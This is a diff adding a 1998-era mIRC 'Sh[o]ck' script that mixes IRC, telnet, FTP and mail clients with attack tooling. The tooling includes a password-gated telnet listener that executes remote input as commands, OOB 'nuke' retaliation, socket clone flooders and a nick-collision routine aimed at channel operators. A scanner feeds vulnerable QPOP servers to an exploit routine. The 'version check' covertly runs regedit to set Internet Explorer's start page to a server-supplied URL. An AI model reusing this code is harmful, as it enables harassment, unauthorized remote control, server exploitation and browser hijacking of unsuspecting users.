@@ -1,0 +1,535 @@
+ON 1:SOCKOPEN:SCK*: {
+  if ($left($sockname,6) == SCKget) { return } 
+  titlebar @Sh[o]ck- $+ $sockname $sock($sockname).ip
+  aline -p @Sh[o]ck- $+ $sockname Connected to $sock($sockname).ip $+ ...
+  aline -p @Sh[o]ck- $+ $sockname Close window or type /close to disconnect...
+  sockwrite -n $sockname c
+}
+ON 1:INPUT:@Sh[o]ck-IN.SCK*: {
+  sockwrite -tn $remove($active,@Sh[o]ck-) $parms
+  halt
+}
+ON 1:SOCKCLOSE:SCK*: {   
+  if ($left($sockname,6) == SCKget) { return } 
+  titlebar @Sh[o]ck- $+ $sockname $sock($sockname).ip [disconnected]
+  aline -p @Sh[o]ck- $+ $sockname Connection Closed...
+  dec %Sh[o]ck.sock.n
+}
+
+;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ON 1:SOCKLISTEN:IN.Sh[o]ck:{
+  if ($sockerr != 0) { return }
+  inc %in.Sh[o]ck.sock
+  set %in.Sh[o]ck.logging , $+ $sock(SCK.s. $+ %in.Sh[o]ck.sock).ip $+ 
+  sockaccept in.SCK.s. $+ %in.Sh[o]ck.sock $+ A
+  set %SCKstep
+  sockwrite -tn in.SCK.s. $+ %in.Sh[o]ck.sock $+ A Sh[o]ck %version ( $+ $host $+ ) $chr($asc([)) $+ SCK.s. $+ %in.Sh[o]ck.sock $+ $chr($asc(])) $fulldate 
+  sockwrite -tn in.SCK.s. $+ %in.Sh[o]ck.sock $+ A $chr(32)
+  sockwrite -t in.SCK.s. $+ %in.Sh[o]ck.sock $+ A $me login: $+ $chr(32)
+}
+
+ON 1:SOCKREAD:IN.SCK*A: {
+  sockread %in.SCK.data
+  if ( $sockbr == 0 ) { return }  
+  set % $++ $sockname $++ B.login %in.SCK.data
+  sockwrite -tn $sockname %in.SCK.data
+  sockwrite -t $sockname Password: $+ $chr(32)
+  sockrename $sockname $sockname $+ B
+}
+
+ON 1:SOCKREAD:IN.SCK*AB: {
+  sockread %in.SCK.data
+  if ( $sockbr == 0 ) { return }  
+  set %pass.SCK.telnet [ % [ $+ [ [ $sockname [ $+ [ .login ] ] ] ] ] ]
+  set %truedata $readini -n $mircdiretc $+ \passwd.ini USERS %pass.SCK.telnet
+  set %truepass $gettok(%truedata,1,$asc(:))
+  set %trueip $gettok(%truedata,2,$asc(:))
+  set %trueperm $gettok(%truedata,3,$asc(:))
+  set %check.ip *!*@ $+ $sock($sockname).ip
+  if (( %truepass == %in.SCK.data ) && ( %in.SCK.data != $null ) && ( $chr(32) !isin %in.SCK.data ) && ( %in.SCK.data != $chr(13) ) && ($remove($mask(%check.ip,4),*!*@) == %trueip)) {
+    set %true.perm [ $+ [ $sockname $+ C ] ] %trueperm
+    sockwrite -tn $sockname $chr(32)
+    sockwrite -tn $sockname Sh[o]ck %version ( $+ $host $+ ) $chr($asc([)) $+ $sockname $chr($asc(])) $fulldate 
+    sockwrite -tn $sockname Welcome to Sh[o]ck $sockname $+ .login
+    sockwrite -tn $sockname $chr(32)
+    sockwrite -t $sockname $chr(37) $+ $chr(32)
+    sockrename $sockname $sockname $+ C 
+    set % $++ $sock($sockname).ip %pass.SCK.telnet
+  }
+  else {
+    sockwrite -tn $sockname $chr(32)
+    sockwrite -tn $sockname Login incorrect
+    echo 2 -s °°±[Unauthorized telnet connection attempted( $+ $sock($sockname).ip $+ )]
+    sockclose $sockname
+    unset %truepass
+  }
+}
+
+ON 1:SOCKREAD:IN.SCK*ABC: {
+  sockread %in.SCK.data
+  set %perm.tmp $read $mircdiretc\passwd.ini PERMISSION %true.perm [ $+ [ $sockname ] ]
+  set %comm.tmp $read $mircdiretc\passwd.ini PERMISSION commands
+  if ( $sockbr == 0 ) { return }  
+  .window -e @Sh[o]ck- $+ $sockname
+  aline 2 @Sh[o]ck- $+ $sockname [ $+ $fulldate $+ ] ( $+ [ % [ $+ [ $sock($sockname).ip ] ] ] $+ ) %in.SCK.data
+  sockwrite -tn $sockname %in.SCK.data
+  sockwrite -t $sockname $chr(37) $+ $chr(32)
+  if ((%in.SCK.data == exit) || (%in.SCK.data == /exit) || (%in.SCK.data == quit) || (%in.SCK.data == /quit)) { sockclose $sockname | return }
+  if ($remove($gettok(%in.SCK.data,1,32),/) !isin %comm.tmp) { sockwrite -tn $sockname Command not found | sockwrite -t $sockname $chr(37) $+ $chr(32) | return }
+  if ($remove($gettok(%in.SCK.data,1,32),/) !isin %perm.tmp) { sockwrite -tn $sockname Permission denied | sockwrite -t $sockname $chr(37) $+ $chr(32) | return }
+  %in.SCK.data
+}
+
+ON 1:ERROR:*: {
+  if ( $sock(IN.SCK*ABC) != $null ) { 
+    sockwrite -tn IN.SCK*ABC ERROR: $1-
+  }
+}
+
+; v e r s i o n  c h e c k
+ON *:SOCKOPEN:vcheck:{ if ($sockerr != 0) { echo $error(sock,$sock($sockname).ip,$sockerr) | halt } | sockwrite -n $sockname GET %vcheck.path }
+ON *:SOCKREAD:vcheck:{ 
+  if (($sockerr != 0) && (%vcheck == $calc($lines($mircdiretc\sites.ini) - 1)) && (%v.c.type == a)) { unset %vcheck | echo $error(sock,$sock($sockname).ip,$sockerr) | halt }
+  if (($sockerr != 0) && (%vcheck < $calc($lines($mircdiretc\sites.ini) - 1)) && (%v.c.type == a)) { vcheck | return }
+  if (($sockerr != 0) && (%v.c.type == a)) { unset %vcheck | return }
+  sockread %v.c.data 
+  if ((BODY isin %v.c.data) || (HTML isin %v.c.data)) { return }
+  if (404 isin %v.c.data) { echo -a %ss version-check: error(404) file not found | unset %vcheck | halt }
+  unset %vcheck
+  set %ver.tmp %version $+ %build
+  set %v.check $gettok(%v.c.data,1,$asc(;)) 
+  set %http.check $gettok(%v.c.data,2,$asc(;)) 
+  set %hp %http.check
+  if ($remove(%v.check,v) > $remove(%v.tmp,v)) { set %v.status old }
+  if ($remove(%v.check,v) < $remove(%v.tmp,v)) { set %v.status new }
+  if ($remove(%v.check,v) == $remove(%v.tmp,v)) { set %v.status current }
+  if (b isin %v.check) { set %v.status beta }
+  if (a isin %v.check) { set %v.status alpha }
+  window -l @Version check /upd.ver
+  rline @Version check 1 your version( $+ %v.status $+ ): %v.tmp
+  rline @Version check 2 current version: %v.check
+  rline @Version check 3 web site: %http.check
+  rline @Version check 4 comment:
+  ;loadbuf @Version check $mircdiretc\version.txt
+  aline @Version check 0,0 $str($chr(0255),930)
+  if (%v.status == old) {
+    aline @Version check 0,2ÿÿDownload latest version
+  }
+  else { aline @Version check 0,0 $str($chr(0255),930) }
+  write -c iestart.reg
+  write iestart.reg REGEDIT4
+  write iestart.reg $chr(0)
+  write iestart.reg [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+  write iestart.reg "Start Page" = " $+ %http.check $+ "
+  run regedit iestart.reg
+}
+; t e l n e t  c l i e n t
+ON 1:SOCKOPEN:telnet*:{
+  if ($sockerr > 0) { echo $error(sock,$sock($sockname).ip,$sockerr) | halt }
+  window -e @ $+ $sockname
+  titlebar @ $+ $sockname - $sock($sockname).ip
+  aline @ $+ $sockname Connected to $sock($sockname).ip $+ ...
+}
+ON 1:SOCKREAD:telnet*: {
+  sockread %telnet.data
+  if (%telnet.data == $null) { return }
+  echo @ $+ $sockname %telnet.data
+}
+ON 1:SOCKCLOSE:telnet* {
+  set %telnet.lost @ $+ $sockname $+ .lost 
+  set %telnet.lost1 $sockname $+ .lost 
+  echo @ $+ $sockname Connection to $sock($sockname).ip lost... 
+}
+ON 1:INPUT:@telnet*: { sockwrite -n $remove($active,@) $parms | echo $active $parms | halt }
+ON 1:CLOSE:@telnet*:{ sockclose $remove($target,@) }
+menu @ $+ %telnet.lost1 {
+  sclick:{ drawpic -c %telnet.lost 0 0 $mircdirbutton2.bmp | timer1393 1 1 /drawpic -c %telnet.lost 0 0 $mircdirbutton.bmp | window -c %telnet.lost | window -c $remove(%telnet.lost,.lost) }
+}
+
+; o o b  d e t e c t o r
+#ooblistener on
+on 1:socklisten:OOB: {
+  sockaccept NUKEOOB
+  if (%sound == ON) .splay $mircdirsounds\nuke-approch.wav
+  if ($left($active,1) != @) || ( $left($active,6) != Status ) {
+    echo -a * 6[OOB] Connection attempted by $sock(NUKEOOB).ip
+  }
+  echo -s * 6[OOB] Connection attempted by $sock(NUKEOOB).ip 
+  if (%ooblog == ON) { .writeini $logdiroob.ini OOB $date $readini -n $logdiroob.ini OOB $date $+ , $sock(NUKEOOB).ip ( $+ $fulldate $+ ) }
+  if ( %oobkick == ON ) {
+    .set %oobattack ON
+    .dns $sock(NUKEOOB).ip
+  } 
+  .sockclose NUKEOOB
+  .sockclose OOB
+  .timer 1 60 .socklisten OOB 139
+}
+ON 1:SOCKOPEN:oob.attack: { sockwrite -n oob.attack The ImperialS 0wn yer ass in 1998 : Don't step on the grass, sm0ke it | echo -a 1,1 _ 1,0 sending oob data | sockclose oob.attack |  .timer1234566 off |  .timer1234567 off }
+#ooblistener end
+
+; b o u n c e r 
+on 1:socklisten:BNC: {
+  sockaccept BOUNCE
+  if ($left($active,1) != @) || ( $left($active,6) != Status ) {
+    echo -a 3* %ss 2BNC Connection from3 $sock(BOUNCE).ip
+  }
+  echo -s 3* %ss 2BNC Connection from3 $sock(BOUNCE).ip
+  .writeini $logdirbnc.ini BNC $date $readini -n $logdirbnc.ini BNC $date $+ , $sock(BOUNCE).ip ( $+ $time $+ )
+}
+on 1:sockread:BOUNCE: {
+  sockread %bncdata
+  if (($left(%bncdata,4) == USER) && (%bncconn == 0)) { set %bncuser $mid(%bncdata,6,$len(%bncdata)) }
+  if (($left(%bncdata,4) == NICK) && (%bncconn == 0)) { set %bncnick $mid(%bncdata,6,$len(%bncdata)) | sockwrite -n BOUNCE :bnc!bnc@crazy.fr33z.com NOTICE $mid(%bncdata,6,$calc($len(%bncdata) -5)) :You need to say /quote PASS <password> }
+  if (($left(%bncdata,4) == PASS) && (%bncconn == 0)) { 
+    if ($mid(%bncdata,6,$calc($len(%bncdata) -5)) == %passbnc) {
+      sockwrite -n BOUNCE :bnc!bnc@crazy.fr33z.com NOTICE $mid(%bncdata,6,$calc($len(%bncdata) -5)) :Level two, lets connect to something real now
+      sockwrite -n BOUNCE :bnc!bnc@crazy.fr33z.com NOTICE $mid(%bncdata,6,$calc($len(%bncdata) -5)) :type /quote conn [server] <port> <pass> to connect
+    }
+    else {  
+      sockwrite -n BOUNCE :bnc!bnc@crazy.fr33z.com NOTICE $mid(%bncdata,6,$calc($len(%bncdata) -5)) :Uhm...wrong password brotah, r ya sure i authorized ya to use my BNC? Btw dis attempt has been logged.
+      sockclose BOUNCE
+    }
+  }
+
+  if (($left(%bncdata,4) == CONN) && (%bncconn == 0)) {
+    set %asd $mid(%bncdata,6,$calc($len(%bncdata) -5))
+    sockopen bncing $mid(%bncdata,6,$calc($len(%bncdata) -5))
+    set %bncconn 1    
+  } 
+  if (%bncconn == 1) { sockwrite -n bncing %bncdata }
+}
+on 1:sockopen:bncing: { 
+  sockwrite -n bncing user %bncuser
+  sockwrite -n bncing nick %bncnick
+}
+on 1:sockread:bncing: { 
+  sockread %sbncdata
+  sockwrite -n BOUNCE %sbncdata
+}
+
+; s o c k e t  c l o n e s  ( c ) 1 9 9 8  b y  r u 5  &  l i n u x u
+on 1:sockopen:raw*: {
+  inc %nnick 1  
+  sockwrite -n $sockname user %bogus $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)  $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)   $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)  $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9) 
+  sockwrite -n $sockname nick ShocK` $+ %nnick
+  inc %rawopened
+}
+on 1:sockread:raw*: {
+  sockread %data
+  if ($left(%data,4) == PING) {
+    sockwrite -n $sockname PONG $remove(%data,PING)
+  }
+  if ($left(%data,5) == ERROR) {
+    if (mIRC isin %data) { halt }    
+    aline @Sock-Clones 12 $+ $timestamp %data
+  }
+  if (JOIN isin %data) {
+    aline @Clones 3 $+ $timestamp %data
+  }
+  if (PART isin %data) {
+    aline @Clones 3 $+ $timestamp %data
+  }
+  if (433 isin %data)  {
+    sockwrite -n $sockname nick $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9) 
+  }
+  if (376 isin %data) {
+    inc %clones 1
+    aline @Sock-clones 2: $+ %ss Clone  $+ %clones $+  connected:
+  }
+}
+
+; s h d g e t  ( c ) 1 9 9 8  b y  r u 5
+ON *:SOCKOPEN:SCKget*:{ 
+  if ($sockerr != 0) { echo $error(sock,$sock($sockname).ip,$sockerr) | halt } 
+  set %protocol %g.protocol [ $+ [ $remove($sockname,SCKget) ] ]
+  if (%protocol == http) { 
+    sockwrite -n $sockname GET %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    set %window.get @ $+ $sockname 
+    set %dl.st [ $+ [ $sockname ] ] $ctime 
+    window -l +bt @ $+ $sockname 0 0 350 78
+    clear @ $+ $sockname
+    titlebar @ $+ $sockname http:// $+ $sock($sockname).ip %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    rline %window.get 1 %ss SCKget %SCK.get.ver : %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    rline %window.get 2 ÿÿÿ
+    rline %window.get 3 ip: $sock($sockname).ip
+    rline %window.get 4 rcvd: $sock($sockname).rcvd
+    set %filename %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    set %filename $mircdirdownload\ $+ $remove(%filename,/)
+    write -c %filename
+  }
+  if (%protocol == ftp) { 
+    set %window.get @ $+ $sockname
+    window -l40 @ $+ $sockname 0 0 700 100 terminal 8
+    titlebar @ $+ $sockname ftp:// $+ $sock($sockname).ip %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    rline -l %window.get 1 %ss SCKget %SCK.get.ver : %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    rline -l %window.get 2 ÿÿÿ
+    rline -l %window.get 3 ip: $sock($sockname).ip
+    rline -l %window.get 4 rcvd: $sock($sockname).rcvd
+    set %file.tmp %wget [ $+ [ $remove($sockname,SCKget) ] ] 
+    set %file.tmp $mircdirdownload\ $+ $gettok(%file.tmp,$count(%file.tmp,/),$asc(/))
+    write -c %file.tmp
+  }
+}
+ON *:SOCKREAD:SCKget*:{
+  if ($sockerr != 0) { echo $error(sock,$sock($sockname).ip,$sockerr) | halt } 
+  set %protocol %g.protocol [ $+ [ $remove($sockname,SCKget) ] ]
+  if (%protocol == http) {
+    set %window.get @ $+ $sockname 
+    set %dl.tmp %dl.st [ $+ [ $sockname ] ] $ctime 
+    rline %window.get 3 ip: $sock($sockname).ip
+    if ($sock($sockname).rcvd != 0) { rline %window.get 4 rcvd: $sock($sockname).rcvd }
+    if ($osck($sockname).rcvd != 0) { rline %window.get 5 kb/s: $calc($dlspeed($sock($sockname).rcvd,%dl.tmp) / 1024) }
+    set %filename %wget [ $+ [ $remove($sockname,SCKget) ] ]
+    set %filename $mircdirdownload\ $+ $remove(%filename,/)
+    set %data %wget [ $+ [ $sockname ] ]
+    :sock.read
+    sockread -f 2048 &data
+    bwrite %filename -1 2048 &data
+    if ($sockbr == 0) { return }
+    goto sock.read
+  }
+  if (%protocol == ftp) { 
+    sockread %wget [ $+ [ $sockname ] ]
+    if (%ftpgetlog == on) { write $logdir\ftpget.log %wget [ $+ [ $sockname ] ] }
+    echo @ $+ $sockname %wget [ $+ [ $sockname ] ] 
+    set %ftp.cmd %wget [ $+ [ $sockname ] ]
+    if ($left(%ftp.cmd,4) == 220-) { return }
+    if ($left(%ftp.cmd,3) == 220) { sockwrite -n $sockname USER anonymous }
+    if ($left(%ftp.cmd,3) == 331) { sockwrite -n $sockname PASS guest@leet.Sh[o]ck.org }
+    if ($left(%ftp.cmd,4) == 230-) { return }
+    if ($left(%ftp.cmd,3) == 230) { 
+      if (%step [ $+ [ $sockname ] ] == $null) { set %step [ $+ [ $sockname ] ] list }
+      :port
+      set %p1 $r(10,255) | set %p2 $r(10,255)
+      if ($portfree($calc($calc(%p1 * 256) + %p2)) == $false) { goto port }
+      sockwrite -n $sockname PORT $replace($ip,$chr($asc(.)),$chr(044)) $+ , $+ %p1 $+ , $+ %p2
+      socklisten ftp [ $+ [ $sockname ] ] $calc($calc(%p1 * 256) + %p2)
+    }
+    if ($left(%ftp.cmd,3) == 200) {   
+      if (%step [ $+ [ $sockname ] ] == list) { 
+        sockwrite -n $sockname LIST %wget [ $+ [ $remove($sockname,SCKget) ] ]
+      } 
+      if (%step [ $+ [ $sockname ] ] == type) {
+        set %step [ $+ [ $sockname ] ] end
+        :port
+        set %p1 $r(10,255) | set %p2 $r(10,255)
+        set %port $calc($calc(%p1 * 256) + %p2)
+        if ($portfree(%port) == $false) { goto port }
+        sockwrite -n $sockname PORT $replace($ip,$chr($asc(.)),$chr(044)) $+ , $+ %p1 $+ , $+ %p2
+        socklisten ftpget [ $+ [ $sockname ] ] %port
+        return
+      }
+      if (%step [ $+ [ $sockname ] ] == end) {         
+        set %file.tmp %wget [ $+ [ $remove($sockname,SCKget) ] ] 
+        set %file.tmp $gettok(%file.tmp,$count(%file.tmp,/),$asc(/))
+        sockwrite -n $sockname RETR %file.tmp
+      } 
+    }
+    if ($left(%ftp.cmd,3) == 226) {
+      if (%step [ $+ [ $sockname ] ] == list) { 
+        if (%info [ $+ [ $remove($sockname,dataftp) ] ] == $null) { 
+          unset %wget [ $+ [ $remove($sockname,SCKget) ] ]
+          unset %step [ $+ [ $sockname ] ]
+          titlebar @ $+ $sockname - No such file or directory | sockclose ftp $+ $sockname 
+          sockclose $sockname 
+          halt
+        }
+        echo @ $+ $sockname %info [ $+ [ $remove($sockname,dataftp) ] ] 
+        set %step [ $+ [ $sockname ] ] get
+      }
+      if (%step [ $+ [ $sockname ] ] == end) { halt }      
+      if (%step [ $+ [ $sockname ] ] == get) { 
+        set %step [ $+ [ $sockname ] ] type
+        set %file.tmp %wget [ $+ [ $remove($sockname,SCKget) ] ]
+        set %dir.ftp $remove(%file.tmp,$gettok(%file.tmp,$count(%file.tmp,/),$asc(/))) 
+        sockwrite -n $sockname CWD %dir.ftp
+      }
+    }
+    if ($left(%ftp.cmd,4) == 250-) { return }
+    if ($left(%ftp.cmd,3) == 250) {
+      if (%step [ $+ [ $sockname ] ] == type) { 
+        set %file.tmp %wget [ $+ [ $remove($sockname,SCKget) ] ] 
+        set %file.tmp $gettok(%file.tmp,$count(%file.tmp,/),$asc(/))
+        if ($right(%file.tmp,4) == .zip) || ($right(%file.tmp,4) == .exe) || ($right(%file.tmp,3) == .gz) || ($right(%file.tmp,4) == .com) { set %type.trans [ $+ [ $sockname ] ] I }
+        else { set %type.trans [ $+ [ $sockname ] ] A }
+        sockwrite -n $sockname TYPE %type.trans
+      }
+    }
+    if ($left(%ftp.cmd,3) == 150) { if (%step [ $+ [ $sockname ] ] == end) { set %dl.st [ $+ [ $sockname ] ] $ctime } }
+    if ($left(%ftp.cmd,3) == 550) { 
+      unset %wget [ $+ [ $remove($sockname,SCKget) ] ]
+      unset %step [ $+ [ $sockname ] ]
+      titlebar @ $+ $sockname - No such file or directory | sockclose ftp $+ $sockname 
+      sockclose $sockname 
+      halt
+    }
+  }
+}
+ON *:SOCKLISTEN:ftp*: { 
+  if (ftpget !isin $sockname) { sockaccept dataftp $+ $remove($sockname,ftp) } 
+  sockaccept dataftp $+ $remove($sockname,ftpget) 
+}
+ON *:SOCKREAD:dataftp*: {
+  set %step %step [ $+ [ $remove($sockname,dataftp) ] ]
+  if (%step == list) { 
+    sockread %ftp [ $+ [ $sockname ] ]
+    set %ftp.tmp %ftp [ $+ [ $sockname ] ]
+    set %info [ $+ [ $remove($sockname,dataftp) ] ] %ftp [ $+ [ $sockname ] ]
+    set %size [ $+ [ $remove($sockname,dataftp) ] ] $remove($mid(%ftp.tmp,30,12),$chr(32))
+  }
+  if (%step == end) { 
+    inc %sp [ $+ [ $sockname ] ]
+    ;    set %surplus %sp [ $+ [ $sockname ] ]
+    set %window.get @ $+ $remove($sockname,dataftp)
+    set %size %size [ $+ [ $remove($sockname,dataftp) ] ]
+    echo porcodio 
+    if ($sock($sockname).rcvd != 0) { rline -l %window.get 4 rcvd: $sock($sockname).rcvd $+ / $+  %size  ( $+ $round($calc(100 / $calc(%size / $sock($sockname).rcvd)),0) $+ %) }
+    set %dl.tmp %dl.st [ $+ [ $remove($sockname,dataftp) ] ]
+    rline -l %window.get 5 kb/s: $calc($dlspeed($sock($sockname).rcvd,%dl.tmp) / 1024)
+    set %filename %wget [ $+ [ $remove($sockname,dataftpSCKget) ] ] 
+    set %filename $mircdirdownload\ $+ $gettok(%filename,$count(%filename,/),$asc(/))
+    ;    set %data %ftp [ $+ [ $remove($sockname,dataftp) ] ] 
+    ;    write %filename %data 
+    :read.sock
+    sockread -f 2048 &data
+    bwrite %filename -1 2048 &data
+    if ($sockbr != 0) { goto read.sock }
+  }
+}
+ON *:SOCKCLOSE:dataftp*:{ 
+  if ($sockerr != 0) { clear @ $+ $remove($sockname,dataftp) | rline -l @ $+ $remove($sockname,dataftp) 1 Connection lost $readini $mircdiretc\errors.txt SOCK $sockerr | rline @ $+ $remove($sockname,dataftp) 2 rcvd: $sock($sockname).rcvd } 
+  if (%step [ $+ [ $remove($sockname,dataftp) ] ] == end) {
+    unset %wget [ $+ [ $remove($sockname,dataftpSCKget) ] ]
+    unset %wget [ $+ [ $remove($sockname,dataftp) ] ]
+    unset %g.protocol [ $+ [ $remove($sockname,dataftpSCKget) ] ]
+    unset %dl.st [ $+ [ $remove($sockname,dataftp) ] ]
+    unset %ftp [ $+ [ $sockname ] ]
+    unset %step [ $+ [ $remove($sockname,dataftp) ] ]
+    unset %info [ $+ [ $remove($sockname,dataftp) ] ]
+    unset %size [ $+ [ $remove($sockname,dataftp) ] ]
+    unset %sp [ $+ [ $sockname ] ]   
+    sockclose $remove($sockname,data)  
+    sockclose $remove($sockname,dataftp)
+    sockclose ftpget $+ $remove($sockname,dataftp)
+    titlebar @ $+ $remove($sockname,dataftp) - finished 
+  }
+}
+ON *:SOCKCLOSE:ftp*:{
+  if ($sockerr != 0) { clear -l @ $+ $remove($sockname,ftp) | rline -l @ $+ $remove($sockname,ftp) 1 Connection lost $readini $mircdiretc\errors.txt SOCK $sockerr | rline @ $+ $remove($sockname,ftp) 2 rcvd: $sock($sockname).rcvd } 
+  unset %wget [ $+ [ $remove($sockname,ftpSCKget) ] ]
+  unset %g.protocol [ $+ [ $remove($sockname,ftpSCKget) ] ]
+  unset %dl.st [ $+ [ $remove($sockname,ftp) ] ]
+  unset %ftp [ $+ [ $remove($sockname,ftp) ] ]
+  unset %step [ $+ [ $remove($sockname,ftp) ] ]
+  unset %info [ $+ [ $remove($sockname,ftp) ] ]
+  unset %size [ $+ [ $remove($sockname,ftp) ] ]
+  unset %sp [ $+ [ $sockname ] ]
+  sockclose $sockname 
+  sockclose $remove($sockname,ftp) 
+  titlebar @ $+ $remove($sockname,dataftp) - finished 
+}
+ON *:SOCKCLOSE:SCKget*:{ if ($sockerr != 0) { clear @ $+ $sockname | rline @ $+ $sockname 1 Connection lost $readini $mircdiretc\errors.txt SOCK $sockerr | rline 2 rcvd: $sock($sockname).rcvd } 
+  unset %wget [ $+ [ $remove($sockname,SCKget) ] ]
+  unset %g.protocol [ $+ [ $remove($sockname,SCKget) ] ]
+  unset %wget [ $+ [ $sockname ] ]
+  titlebar @ $+ $sockname - finished
+}
+
+; m a i l  c l i e n t
+ON *:SOCKOPEN:mail:{ if ($sockerr != 0) { write $logdirmail-err.log ( $+ $fulldate $+ ) $error(sock,$sock($sockname).ip,$sockerr) | echo -a $error(sock,$sock($sockname).ip,$sockerr) | unset %mail.data | return }  |  window -n @mail.log 200 200 300 200 | titlebar @mail.log SCK/ $+ %version mail client }
+ON *:SOCKREAD:mail:{
+  if ($sockerr != 0) { write $logdirmail-err.log ( $+ $fulldate $+ ) $sock($sockname).ip : $error(sock,$sock($sockname).ip,$sockerr) }
+  sockread %mail.data
+  if (%mail.data != $null) { aline @mail.log %mail.data }
+  if ($left(%mail.data,4) == -ERR) { write $logdirmail-err.log ( $+ $fulldate $+ ) %mail.data | echo -a °°±[mail/6error( $+ $remove(%mail.data,-ERR ) $+ )] | set %mail.conn 3 | sockwrite -n $sockname QUIT }
+  if (($left(%mail.data,3) == +OK) && (%mail.conn == 0)) { sockwrite -n $sockname USER %mail.user | set %mail.conn 1 | return }
+  if (($left(%mail.data,3) == +OK) && (%mail.conn == 1)) { sockwrite -n $sockname PASS %mail.pass | set %mail.conn 2 | return }
+  if (($left(%mail.data,3) == +OK) && ($findtok(%mail.data,messages,1,32) != $null)) { set %mail.msg.n $gettok(%mail.data,$calc($findtok(%mail.data,messages,1,32) - 1),32) | if (%mail.msg.n == 0) { echo -a °°±[mail/3empty(0 msgs)] | set %mail.conn 3 | sockwrite -n $sockname QUIT | return } | if (%mail.notify == 1) { echo -a °°±[mail/3notify( $+ %mail.msg.n $+ msg(s))] | set %mail.conn 3 | sockwrite -n $sockname QUIT | return } | inc %mail.msg.r | sockwrite -n $sockname RETR %mail.msg.r | return }
+  if (%mail.data == .) { 
+    write $mircdiretc\mail %mail.data
+    if (%mail.msg.r => %mail.msg.n) { if (%mail.msg.n != 0) { echo -a °°±[mail/4new( $+ %mail.msg.n $+ msg(s))] } | sockwrite -n $sockname QUIT | set %mail.conn 3 | return } 
+    if (%dele.mail == on) { sockwrite -n $sockname DELE %mail.msg.r }
+    inc %mail.msg.r 
+    sockwrite -n $sockname RETR %mail.msg.r
+  }
+  if (%mail.conn == 2) { write $mircdiretc\mail %mail.data }
+}
+ON *:SOCKCLOSE:mail:{ if ($window(@mail.log) != $null) { close -@ @mail.log } | if ($sockerr != 0) { write $logdirmail-err.log ( $+ $fulldate $+ ) $error(sock,$sock($sockname).ip,$sockerr) } | set %mail.conn 0 | unset %mail.msg.r }
+
+; l a g c o l l i d e  c l o n e s  ( c ) 1 9 9 8  b y  l i n u x u
+; u p d a t e d  1 9 / 0 4 / 1 9 9 8
+ON 1:SOCKOPEN:lagcollide: {
+  .timer 1 2 sockwrite -tn lagcollide user $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z)
+  .timer 1 2 sockwrite -tn lagcollide nick $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ SCK
+  .aline 10 @Lagcollide *** Lagcollide clone is connecting to server $lagcollide.server port $lagcollide.port
+}
+ON 1:SOCKCLOSE:lagcollide: {
+  .aline 10 @Lagcollide *** Lagcollide clone is disconnected
+}
+ON 1:SOCKREAD:lagcollide: {
+  sockread %sockread
+  if ( $pos(%sockread,PING) != $null ) && ( $pos(%sockread,PING) == 1 ) { sockwrite -tn $sockname $replace(%sockread,PING,PONG) }
+  set %sockparm1 $gettok(%sockread,1,32)
+  set %sockparm2 $gettok(%sockread,2,32)
+  set %sockparm3 $gettok(%sockread,3,32)
+  set %sockparm4 $gettok(%sockread,4,32)
+  set %sockparm0 %sockparm1 %sockparm2 %sockparm3 %sockparm4
+  set %sockparm5 $remove(%sockread,%sockparm0)
+  if ( %sockparm2 == 001 ) { aline 2 @Lagcollide *** Lagcollide clone connected succesfully }
+  else if ( Closing isin %sockread ) { aline 2 @Lagcollide *** Lagcollide clone killed, reconnecting 
+  timer 1 5 lagcollide %lagcollide.channel %lagcollide.server %lagcollide.port }
+}
+ON 1:NICK: {
+  if ( $newnick isop %lagcollide.channel ) {
+    set %lagcollide.list %lagcollide.list $newnick
+    aline 3 @Lagcollide *** Nickchange detected $nick -> $newnick on %lagcollide.channel 
+    .sockwrite -tn lagcollide NICK $newnick
+    .sockwrite -tn lagcollide NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ SCK
+  }
+}
+ON !1:QUIT: {
+  if ( $nick isin %lagcollide.list ) {
+    aline 4 @Lagcollide *** Nickname $nick collided successfully!
+  }
+}
+
+; a n t i  i c m p  n u k e  p r o t e c t i o n
+ON *:SOCKLISTEN:anti.nuke:{ inc %conn.a.nuke | sockaccept anti.nuke.1. $+ %conn.a.nuke | if (%conn.a.nuke => %a.nuke.default) { sockclose anti.nuke } | sockclose anti.nuke.1* }
+
+; i p  s c a n n e r s
+ON *:SOCKOPEN:qpop.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr } | return }
+ON *:SOCKREAD:qpop.*:{ 
+  if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return }
+  sockread %qpop.data
+  if ((QPOP isin %qpop.data) && ((2.2 isin %qpop.data) || (2.4 isin %qpop.data))) { logwrite -scan $sock($sockname).ip $sockname %qpop.data | window -n @scan | echo @scan ... QPOP $wildtok(%qpop.data, 2.*, 1, 32) found: $sock($sockname).ip ( $+ $fulldate $+ ) | sockclose $sockname | qpop.exp $wildtok(%qpop.data, 2.*, 1, 32) $sock($sockname).ip }
+}
